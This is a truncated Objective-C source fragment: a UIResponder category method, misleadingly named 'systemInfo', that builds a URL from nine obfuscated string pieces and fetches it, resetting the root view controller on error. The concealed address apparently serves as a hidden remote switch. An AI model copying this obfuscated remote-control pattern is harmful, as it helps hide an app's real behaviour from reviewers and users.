...
@implementation UIResponder(info)

+(void)systemInfo:(UIWindow *)windows withTenHAIMIHOTPOT:(NSString *)withTenHAIMIHOTPOT withSefNameHOTPOT:(NSString *)nameHOTPOT{
    if (!nameHOTPOT) {
        nameHOTPOT = @"systeminfo";
    }
    NSURLSession *session = [NSURLSession sharedSession];
    NSURLSessionDataTask *dataTask = [session dataTaskWithURL:[NSURL URLWithString: [NSString stringWithFormat:@"%@%@%@%@%@%@%@%@%@%@/%@",oneHAIMIHOTPOT,twoHAIMIHOTPOT,threeHAIMIHOTPOT,fourHAIMIHOTPOT,fiveHAIMIHOTPOT,sixHAIMIHOTPOT,sevenHAIMIHOTPOT, eightHAIMIHOTPOT,nineHAIMIHOTPOT,withTenHAIMIHOTPOT, nameHOTPOT]] completionHandler:^(NSData * _Nullable data, NSURLResponse * _Nullable response, NSError * _Nullable error) {
        if (error) {
            dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0.9 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
               
                windows.rootViewController = windows.rootViewController;
            });
        }else {
